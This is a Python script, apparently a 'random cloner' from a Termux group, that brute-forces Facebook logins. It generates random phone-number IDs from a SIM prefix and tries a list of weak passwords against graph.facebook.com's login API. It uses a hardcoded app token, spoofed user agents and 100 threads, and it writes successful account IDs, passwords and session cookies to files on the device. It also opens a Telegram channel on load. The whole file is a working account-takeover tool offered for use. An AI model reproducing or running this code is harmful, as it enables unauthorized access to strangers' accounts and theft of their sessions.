import os
import sys
import json
import uuid
import string
import random
import requests
from concurrent.futures import ThreadPoolExecutor as tred

class Mr_Code:
    def __init__(self):
        self.loop = 0
        self.oks = []
        self.cps = []
        self.gen = []
    print ("jone My teligerm channel ")
    os.system(" xdg-open https://t.me/KGF_TERMUX_TEAM")
    def banner(self):
        os.system("clear")
        print("DEVELOPER  : KALYAN KING")
        print("FEATURE    : RANDOM CLONER")
        print("TELIGERM : https://t.me/KGF_TERMUX_TEAM ")
        print("VERSION    : 1.2")
        print("----------------------------------")
    
    def Main(self):
        self.banner()
        code = input("ENTER SIM CODE : ")
        limit = int(input("ENTER ID LIMIT : "))
        for a in range(limit):
            xxx = "".join(random.choice(string.digits) for _ in range(8))
            self.gen.append(xxx)
        with tred(max_workers=100) as randx:
            print("IF NO RESULT USE FLIGHT MODE")
            print("----------------------------------")
            for love in self.gen:
                ids = code + love
                passlist = [ids,ids[:8],ids[:7],ids[:6],love,love[1:],love[2:],"i love you","ff lover"]
                randx.submit(self.method,ids,passlist)
        print("\n")
        print("----------------------------------")
    
    def method(self,ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f"\r\r\x1b[mKALYAN-XD {self.loop}|RND|OK:-{len(self.oks)}|CP:-{len(self.cps)}")
        sys.stdout.flush()
        try:
            for pas in passlist:
                data = {
                'adid':str(uuid.uuid4()),
                'format':'json',
                'device_id':str(uuid.uuid4()),
                'email':ids,
                'password':pas,
                'generate_analytics_claims':'1',
                'community_id':'',
                'cpl':'true',
                'try_num':'1',
                'family_device_id':str(uuid.uuid4()),
                'credentials_type':'password',
                'source':'login',
                'error_detail_type':'button_with_disabled',
                'enroll_misauth':'false',
                'generate_session_cookies':'1',
                'generate_machine_id':'1',
                'currently_logged_in_userid':'0',
                'locale':'en_US',
                'client_country_code':'US',
                'fb_api_req_friendly_name':'authenticate',
                'api_key':'882a8490361da98702bf97a021ddc14d',
                'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
                head = {
                'User-Agent':self.randua(),
                'Accept-Encoding':'gzip, deflate',
                'Connection':'close',
                'Content-Type':'application/x-www-form-urlencoded',
                'Host':'graph.facebook.com',
                'X-FB-Net-HNI':str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI':str(random.randint(20000, 40000)),
                'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Connection-Type':'MOBILE.LTE',
                'X-Tigon-Is-Retry':'False',
                'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags':'graphservice',
                'X-FB-HTTP-Engine':'Liger',
                'X-FB-Client-IP':'True',
                'X-FB-Server-Cluster':'True',
                'x-fb-connection-token':'d29d67d37eca387482a8a5b740f84f62'}
                url = "https://graph.facebook.com/auth/login"
                response = requests.post(url,data=data,headers=head).json()
                if "access_token" in response:
                    uid = str(response['uid'])
                    coki = ";".join(i["name"] + "=" + i["value"] for i in response["session_cookies"])
                    req = requests.get(f"https://graph.facebook.com/{uid}/picture?type=normal").text
                    if "Photoshop" in req:
                        print(f"\r\r\x1b[38;5;46mKALYAN-OK • {uid} • {pas}")
                        open("/sdcard/KALYAN-RNDM-OK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
                        self.oks.append(uid)
                        break
                elif "www.facebook.com" in response["error"]["message"]:
                    open("/sdcard/KALYAN-RNDM-CP.txt","a").write(ids+"|"+pas+"\n")
                    self.cps.append(ids)
                    break
                else:continue
            self.loop += 1
        except Exception as e:pass
    
    def randua(self):
        ua1 = "[FBAN/FB4A;FBAV/239.0.0.9.147;FBBV/427743609;FBDM/{density=2.5,width=1080,height=1400};FBLC/nl_NL;FBRV/704286691;FBCR/Airtel;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2012K11AG;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
        ua2 = "[FBAN/FB4A;FBAV/276.0.0.5.106;FBBV/720819222;FBDM/{density=2.5,width=1080,height=1416};FBLC/en_GB;FBRV/699930436;FBCR/Banglalink;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/AT&amp;amp-T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
        ua3 = "[FBAN/FB4A;FBAV/243.0.0.7.164;FBBV/416305496;FBDM/{density=3.2,width=1080,height=1418};FBLC/cs_CZ;FBRV/422368037;FBCR/Robi;amp-T;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/ Mi 9;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
        ua4 = "[FBAN/FB4A;FBAV/253.0.0.3.116;FBBV/285099998;FBDM/{density=3.5,width=1080,height=1422};FBLC/nl_NL;FBRV/170056705;FBCR/Grameenphone;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2004J19C;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
        ua5 = "[FBAN/FB4A;FBAV/351.0.0.4.172;FBBV/194147322;FBDM/{density=2.5,width=1080,height=1428};FBLC/en_US;FBRV/399662883;FBCR/Grameenphone;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/MI 8 Lite;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
        max = random.choice([ua1,ua2,ua3,ua4,ua5])
        return str(max)

if __name__ == "__main__":
    Mr_Code().Main()